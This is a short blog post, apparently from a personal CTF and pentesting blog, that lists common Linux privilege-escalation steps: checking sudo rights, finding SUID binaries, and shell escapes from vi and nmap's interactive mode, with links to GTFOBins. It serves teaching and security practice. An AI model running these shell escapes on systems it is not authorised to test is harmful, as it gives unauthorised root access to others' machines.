---
title: Privilege Escalation
published: true
author:
  name: Aissa Ben yahya
date: 2022-02-22 19:25:00 +0100
categories: [Hacking, Tools]
tags: [Hacking, Privilege escalation]
---
In your journey playing CTF or doing real penetration testing you will fall in this situation where you need to escalate your privileges in order to procced further. Without escalating your privileges you will never be able to have a full control on the target machine. Down below you will find some usefull archive of known most common methods of privilege escalation.

### Check sudo privileges
```bash
sudo -l
```

### Find all SUID binaries
```bash
 find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/ckprm
 cat /tmp/ckprm
```

### **vi**
To spawn an interactive shell with vi, you need first to run vi and then execute the following:
```bash
:set shell=/bin/sh
:shell
``` 
To find more about vi privileges escalation visit the following website [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo)

### **Nmap**
The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
```bash
nmap --interactive
nmap> !sh
```
For more infos about privilege escalation with nmap, go to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/)